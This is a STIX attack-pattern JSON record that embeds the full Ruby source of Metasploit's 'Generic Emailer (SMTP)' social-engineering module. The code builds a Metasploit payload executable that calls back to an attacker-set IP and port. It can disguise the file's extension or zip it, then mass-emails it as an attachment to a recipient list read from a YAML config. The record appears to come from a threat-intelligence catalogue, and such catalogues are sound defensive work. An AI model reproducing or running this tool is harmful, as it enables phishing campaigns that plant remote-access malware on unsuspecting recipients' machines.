{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6de8b70-b856-4740-9b65-e90d5ef1c3cb",
    "created": "2024-08-14T16:31:24.843333Z",
    "modified": "2024-08-14T16:31:24.843337Z",
    "name": "Generic Emailer (SMTP)",
    "description": " This module can be used to automate email delivery. This code is based on Joshua Abraham's email script for social engineering.  'License'        => MSF_LICENSE 'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/client/smtp/emailer.rb",
            "external_id": "emailer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Generic Emailer (SMTP)',\n      'Description'    => %q{\n          This module can be used to automate email delivery.\n        This code is based on Joshua Abraham's email script for social\n        engineering.\n      },\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://spl0it.org/' ],\n        ],\n      'Author'         => [ 'et <et[at]metasploit.com>' ]))\n\n      register_options(\n        [\n          OptString.new('RHOST', [true, \"SMTP server address\",'127.0.0.1']),\n          OptPort.new('RPORT', [true, \"SMTP server port\", 25]),\n          OptString.new('YAML_CONFIG', [true, \"Full path to YAML Configuration file\",\n            File.join(Msf::Config.data_directory,\"emailer_config.yaml\")]),\n        ])\n\n    # Hide this option from the user\n    deregister_options('MAILTO')\n    deregister_options('SUBJECT')\n  end\n\n  def load_yaml_conf\n    opts = {}\n\n    File.open(datastore['YAML_CONFIG'], \"rb\") do |f|\n      yamlconf = YAML::load(f)\n\n      opts['to']                   = yamlconf['to']\n      opts['from']                 = yamlconf['from']\n      opts['subject']              = yamlconf['subject']\n      opts['type']                 = yamlconf['type']\n      opts['msg_file']             = yamlconf['msg_file']\n      opts['wait']                 = yamlconf['wait']\n      opts['add_name']             = yamlconf['add_name']\n      opts['sig']                  = yamlconf['sig']\n      opts['sig_file']             = yamlconf['sig_file']\n      opts['attachment']           = yamlconf['attachment']\n      opts['attachment_file']      = yamlconf['attachment_file']\n      opts['attachment_file_type'] = yamlconf['attachment_file_type']\n      opts['attachment_file_name'] = yamlconf['attachment_file_name']\n\n      ### payload options ###\n      opts['make_payload']         = yamlconf['make_payload']\n      opts['zip_payload']          = yamlconf['zip_payload']\n      opts['msf_port']             = yamlconf['msf_port']\n      opts['msf_ip']               = yamlconf['msf_ip']\n      opts['msf_payload']          = yamlconf['msf_payload']\n      opts['msf_filename']         = yamlconf['msf_filename']\n      opts['msf_change_ext']       = yamlconf['msf_change_ext']\n      opts['msf_payload_ext']      = yamlconf['msf_payload_ext']\n    end\n\n    opts\n  end\n\n  def load_file(fname)\n    buf = ''\n    File.open(fname, 'rb') do |f|\n      buf = f.read\n    end\n\n    buf\n  end\n\n  def run\n\n    yamlconf = load_yaml_conf\n\n    fileto               = yamlconf['to']\n    from                 = yamlconf['from']\n    subject              = yamlconf['subject']\n    type                 = yamlconf['type']\n    msg_file             = yamlconf['msg_file']\n    wait                 = yamlconf['wait']\n    add_name             = yamlconf['add_name']\n    sig                  = yamlconf['sig']\n    sig_file             = yamlconf['sig_file']\n    attachment           = yamlconf['attachment']\n    attachment_file      = yamlconf['attachment_file']\n    attachment_file_type = yamlconf['attachment_file_type']\n    attachment_file_name = yamlconf['attachment_file_name']\n\n    make_payload         = yamlconf['make_payload']\n    zip_payload          = yamlconf['zip_payload']\n    msf_port             = yamlconf['msf_port']\n    msf_ip               = yamlconf['msf_ip']\n    msf_payload          = yamlconf['msf_payload']\n    msf_filename         = yamlconf['msf_filename']\n    msf_change_ext       = yamlconf['msf_change_ext']\n    msf_payload_ext      = yamlconf['msf_payload_ext']\n\n    tmp = Dir.tmpdir\n\n    datastore['MAILFROM'] = from\n\n    msg       = load_file(msg_file)\n\n    if (type !~ /text/i and type !~ /text\\/html/i)\n      print_error(\"YAML config: #{type}\")\n    end\n\n    if make_payload\n      attachment_file = File.join(tmp, msf_filename)\n      attachment_file_name = msf_filename\n\n      print_status(\"Creating payload...\")\n      mod = framework.payloads.create(msf_payload)\n      if (not mod)\n        print_error(\"Failed to create payload, #{msf_payload}\")\n        return\n      end\n\n      # By not passing an explicit encoder, we're asking the\n      # framework to pick one for us.  In general this is the best\n      # way to encode.\n      buf = mod.generate_simple(\n          'Format'  => 'raw',\n          'Options' => { \"LHOST\"=>msf_ip, \"LPORT\"=>msf_port }\n        )\n      exe = generate_payload_exe({\n          :code => buf,\n          :arch => mod.arch,\n          :platform => mod.platform\n        })\n\n      print_status(\"Writing payload to #{attachment_file}\")\n      File.open(attachment_file, \"wb\") do |f|\n        f.write(exe)\n      end\n\n      if msf_change_ext\n        msf_payload_newext = attachment_file\n        msf_payload_newext = msf_payload_newext.sub(/\\.\\w+$/, \".#{msf_payload_ext}\")\n        File.rename(attachment_file, msf_payload_newext)\n        attachment_file = msf_payload_newext\n      end\n\n      if zip_payload\n        zip_file = attachment_file.sub(/\\.\\w+$/, '.zip')\n        print_status(\"Zipping payload to #{zip_file}\")\n        File.write(zip_file, Msf::Util::EXE.to_zip([fname: File.basename(attachment_file), data: exe]), mode: 'wb')\n        attachment_file      = zip_file\n        attachment_file_type = 'application/zip'\n      else\n        attachment_file_type = 'application/exe'\n      end\n\n    end\n\n\n    File.open(fileto, 'rb').each do |l|\n      next if l !~ /\\@/\n\n      nem = l.split(',')\n      name = nem[0].split(' ')\n      fname = name[0]\n      lname = name[1]\n      email = nem[1].strip\n\n\n      if add_name\n        email_msg_body = \"#{fname},\\n\\n#{msg}\"\n      else\n        email_msg_body = msg\n      end\n\n      if sig\n        data_sig = load_file(sig_file)\n        email_msg_body = \"#{email_msg_body}\\n#{data_sig}\"\n      end\n\n      print_status(\"Emailing #{name[0]} #{name[1]} at #{email}\")\n\n      mime_msg = Rex::MIME::Message.new\n      mime_msg.mime_defaults\n\n      mime_msg.from = from\n      mime_msg.to = email\n      datastore['MAILTO'] = email.strip\n      mime_msg.subject = subject\n\n      mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, \"\\r\\n\"), type, \"base64\", \"inline\")\n\n      if attachment\n        if attachment_file_name\n          data_attachment = load_file(attachment_file)\n          mime_msg.add_part(Rex::Text.encode_base64(data_attachment, \"\\r\\n\"), attachment_file_type, \"base64\", \"attachment; filename=\\\"#{attachment_file_name}\\\"\")\n        end\n      end\n\n      send_message(mime_msg.to_s)\n      select(nil,nil,nil,wait)\n    end\n\n    print_status(\"Email sent..\")\n  end\nend\n",
    "x_mitre_contributors": [
        "[ et <et[at]metasploit.com> ]))"
    ]
}